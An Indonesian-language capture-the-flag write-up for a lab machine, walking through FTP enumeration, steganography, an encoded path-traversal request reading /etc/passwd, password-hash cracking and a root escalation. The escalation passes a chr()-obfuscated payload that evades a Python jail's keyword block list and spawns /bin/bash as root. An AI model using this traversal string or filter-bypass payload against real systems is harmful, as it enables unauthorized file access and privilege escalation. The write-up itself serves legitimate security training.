### edisi malas  

Nama room: Tokyo Ghoul  
Difficulty: Medium  

# Where Am I?
scan nmap  
```bash
nmap -A -O -v <IP_MESIN>
```
akan menampilkan berapa port yang terbuka dan OS yang dipakai  

### Planning to Escape
pergi ke http menggunakan IP_Mesin dan gunakan inspect atau view page source  
```html
<html>
<head>
	<title>Welcome To Tokyo goul</title>
	<link rel="stylesheet" type="text/css" href="../css/mainstylesheet.css">
</head>
<body>

	<h1 style="text-align: center;">Kaneki </h1>
	<div class="center-wrapper">
		<img src="tokyo.gif">
	</div>

	<!-- look don't tell jason but we will help you escape we will give you the key to open those chains and here is some clothes to look like us and a mask to look anonymous and go to the ftp room right there -->

	<br>
	<p>Ken Kaneki is a regular high school teenager who decides to go on a date with a girl named Rize Kamishiro. Kaneki fails to notice that there is something unusual about her. The girl then shows her true form and transforms into a ghoul who is hungry for Kaneki flesh. But suddenly, steel beams fall on her from the ceiling and she is instantly killed. Left in a very critical state, Ken is rushed to a hospital nearby. When he regains his consciousness, the doctor informs him that his organs have been replaced with that of Rize .</p>
	<br>
	<p>Kaneki is kidnapped by Jason. He then uses the most brutal ways to torture him by cutting off parts of him but gives him just enough time to regenerate again. While Kaneki seems to take the physical torture like a champ, he begins to struggle when he is reminded of the two other ghouls who gave him hopes of escaping.</p>

	<a href="<RAHASIA>">Can you help him escape?</a>

</body>
</html>
```
setelah itu mendapat petunjuk untuk login ftp menggunakan anonymous  
```bash
└─$ ftp <IP_MESIN>
Connected to <IP_MESIN>.
220 (vsFTPd 3.0.3)
Name (<IP_MESIN>:kali): anonymous
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||45994|)
150 Here comes the directory listing.
drwxr-xr-x    3 ftp      ftp          4096 Jan 23  2021 need_Help?
226 Directory send OK.
ftp> cd need_Help?
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||49655|)
150 Here comes the directory listing.
-rw-r--r--    1 ftp      ftp           480 Jan 23  2021 Aogiri_tree.txt
drwxr-xr-x    2 ftp      ftp          4096 Jan 23  2021 Talk_with_me
226 Directory send OK.
ftp> cat Aogiri_tree.txt
?Invalid command.
ftp> get Aogiri_tree.txt
local: Aogiri_tree.txt remote: Aogiri_tree.txt
229 Entering Extended Passive Mode (|||49680|)
150 Opening BINARY mode data connection for Aogiri_tree.txt (480 bytes).
100% |***********************************************************************************************|   480        3.49 MiB/s    00:00 ETA
226 Transfer complete.
480 bytes received in 00:00 (1.52 KiB/s)
ftp> cd Talk_with_me
250 Directory successfully changed.
ftp> ls
229 Entering Extended Passive Mode (|||42130|)
150 Here comes the directory listing.
-rwxr-xr-x    1 ftp      ftp         17488 Jan 23  2021 need_to_talk
-rw-r--r--    1 ftp      ftp         46674 Jan 23  2021 rize_and_kaneki.jpg
226 Directory send OK.
ftp> get need_to_talk
local: need_to_talk remote: need_to_talk
229 Entering Extended Passive Mode (|||47519|)
150 Opening BINARY mode data connection for need_to_talk (17488 bytes).
100% |***********************************************************************************************| 17488       80.89 KiB/s    00:00 ETA
226 Transfer complete.
17488 bytes received in 00:00 (33.30 KiB/s)
ftp> exit
221 Goodbye.
```
(Ambil semua file nya)  

setelah itu tambahkan izin untuk eksekusi file tersebut menggunakan chmod +x <nama file>  
kemudian cek menggunakan strings untuk mendapatkan kode tersembunyi  
```bash
└─$ strings need_to_talk               
/lib64/ld-linux-x86-64.so.2
...
strcmp
__libc_start_main
free
libc.so.6
GLIBC_2.2.5
_ITM_deregisterTMCloneTable
__gmon_start__
_ITM_registerTMCloneTable
u/UH
You_founH
d_1t
[]A\A]A^A_
<INI PASSWORDNYA>
Hey Kaneki finnaly you want to talk 
Unfortunately before I can give you the kagune you need to give me the paraphrase
Do you have what I'm looking for?
Good job. I believe this is what you came for:
Hmm. I don't think this is what I was looking for.
Take a look inside of me. rabin2 -z
...
```

setelah itu jalankan program tersebut dan kalian akan mendapatkan passphrase yang akan digunakan untuk stego selanjutnya
Kemudian setelah gambar dari ftp diekstrak akan mendapat sebuah file text  
```bash
└─$ steghide --extract -sf rize_and_kaneki.jpg 
Enter passphrase: 
wrote extracted data to "yougotme.txt".
```

isi nya adalah kode morse dan urutan dekode nya adalah: morse, hex, base64  

### What Rize is trying to say?
setelah mendapat "pesan" dari kode tersebut kita bisa memasukkannya ke web sebelummnya: http://<IP_MESIN>/<direktori_rahasia_dari_kode>  
langkah selanjutnya adalah scan isi dari direktori tersebut  
```bash
└─$ gobuster dir --url http://<IP_MESIN>/<direktori_rahasia_dari_kode> -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x txt,php,zip,bak,sql,sqlite,tar,tgz,tar.gz -t 500 
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://<IP_MESIN>/<direktori_rahasia_dari_kode>
[+] Method:                  GET
[+] Threads:                 500
[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              bak,sql,sqlite,tgz,tar.gz,txt,php,zip,tar
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===================================================
/<RAHASIA_EA>                (Status: 301) [Size: 331] [--> http://<IP_MESIN>/<direktori_rahasia_dari_kode>/<RAHASIA_EA>]
Progress: 83066 / 2205610 (3.77%)[ERROR] Get "http://10.81.155.255/d1r3c70ry_center/n3.bak": context deadline exceeded (Client.Timeout exceeded while awaiting headers)
Progress: 87367 / 2205610 (3.96%)^C
[!] Keyboard interrupt detected, terminating.
Progress: 87616 / 2205610 (3.97%)
===============================================================
Finished
===============================================================
```
setelah dapat ternyata muncul puzzle lagi, tapi kita mendapat hint "moonwalk" = jalan kebelakang = LFI traversal  
tapi setelah dicoba kita tidak bisa menggunakan LFI sederhana ../../..//etc/passwd, maka dari itu kita harus enkripsi  

?view=%2F%2E%2E%2F%2E%2E%2F%2E%2E%2Fetc%2Fpasswd  

nah kita mendapatkan isi user dan password dalam bentuk terenkripsi (bagian baris bawah)  

<img width="1482" height="312" alt="image" src="https://github.com/user-attachments/assets/6de7e60a-6fc4-4085-a0e0-a8c511c4269b" />

hint selanjutnya adalah "john" yang berarti john the ripper  
```bash
─$ john --wordlist=/usr/share/wordlists/rockyou.txt --format=sha512crypt hash

Using default input encoding: UTF-8
Loaded 1 password hash (sha512crypt, crypt(3) $6$ [SHA512 512/512 AVX512BW 8x])
Cost 1 (iteration count) is 5000 for all loaded hashes
Will run 8 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
RAHASIA      (RAHASIA)     
1g 0:00:00:00 DONE (2026-01-22 12:47) 9.090g/s 18618p/s 18618c/s 18618C/s 123456..lovers1
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
```

Kita dapat cred untuk login ke ssh

### Fight Jason
```bash
└─$ ssh kamishiro@<IP_MESIN>
kamishiro@<IP_MESIN>'s password: 
Welcome to Ubuntu 16.04.7 LTS (GNU/Linux 4.4.0-197-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage


This system is built by the Bento project by Chef Software
More information can be found at https://github.com/chef/bento

The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.


The programs included with the Ubuntu system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Ubuntu comes with ABSOLUTELY NO WARRANTY, to the extent permitted by
applicable law.

Last login: Sat Jan 23 22:29:38 2021 from 192.168.77.1
kamishiro@vagrant:~$ ls
jail.py  user.txt
kamishiro@vagrant:~$ cat user.txt 
<FLAG_USER>

```

setelah itu untuk root kita cek menggunakan sudo -l dan cek isi jail.py  
```bash
kamishiro@vagrant:~$ sudo -l
[sudo] password for kamishiro: 
Matching Defaults entries for kamishiro on vagrant.vm:
    env_reset, exempt_group=sudo, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User kamishiro may run the following commands on vagrant.vm:
    (ALL) /usr/bin/python3 /home/kamishiro/jail.py
kamishiro@vagrant:~$ cat jail.py 
#! /usr/bin/python3
#-*- coding:utf-8 -*-
def main():
    print("Hi! Welcome to my world kaneki")
    print("========================================================================")
    print("What ? You gonna stand like a chicken ? fight me Kaneki")
    text = input('>>> ')
    for keyword in ['eval', 'exec', 'import', 'open', 'os', 'read', 'system', 'write']:
        if keyword in text:
            print("Do you think i will let you do this ??????")
            return;
    else:
        exec(text)
        print('No Kaneki you are so dead')
if __name__ == "__main__":
    main()

```

Kenapa ini vulnerable?    
Intinya:  
sudo boleh jalanin python3 jail.py sebagai root  
Input kita di-exec(text)  
Filter cuma cek substring polos:  
eval, exec, import, open, os, read, system, write  

target kita dapet shell dari sudo /usr/bin/python3 /home/kamishiro/jail.py  

maka kita jalankan programnya terlebih dahulu  
```bash
sudo /usr/bin/python3 /home/kamishiro/jail.py
```

saat diminta memasukkan input, masukkan payload ini:  
```bash
getattr(__builtins__, chr(101)+chr(120)+chr(101)+chr(99))(chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+chr(111)+chr(115)+chr(59)+chr(111)+chr(115)+chr(46)+chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+chr(39)+chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104)+chr(39)+chr(41))
```

Arti payload:  
getattr(__builtins__, chr(101)+chr(120)+chr(101)+chr(99))  
Tujuan: Dapatkan fungsi exec tanpa menulis kata "exec"  
__builtins__ → modul bawaan Python yang berisi fungsi seperti print, exec, eval, dll.  
chr(101) = 'e'  
chr(120) = 'x'  
chr(101) = 'e'  
chr(99) = 'c'  
s = (  
    chr(105)+chr(109)+chr(112)+chr(111)+chr(114)+chr(116)+chr(32)+  # 'import '  
    chr(111)+chr(115)+chr(59)+                                      # 'os;'  
    chr(111)+chr(115)+chr(46)+                                      # 'os.'  
    chr(115)+chr(121)+chr(115)+chr(116)+chr(101)+chr(109)+chr(40)+  # 'system('  
    chr(39)+                                                        # "'"  
    chr(47)+chr(98)+chr(105)+chr(110)+chr(47)+chr(98)+chr(97)+chr(115)+chr(104)+  # '/bin/bash'  
    chr(39)+chr(41)                                                 # "')"  
)  

jadi aslinya adalah exec("import os;os.system('/bin/bash')")   

setelah dapat tinggal pindah ke direktori root atau bisa juga langsung ambil flagnya  
```bash
root@vagrant:~# whoami
root
root@vagrant:~# pwd
/home/kamishiro
root@vagrant:~# cd /root
root@vagrant:/root# ls
root.txt
root@vagrant:/root# cat root.txt 
<FLAG_ROOT>
```

sekian terima kasih













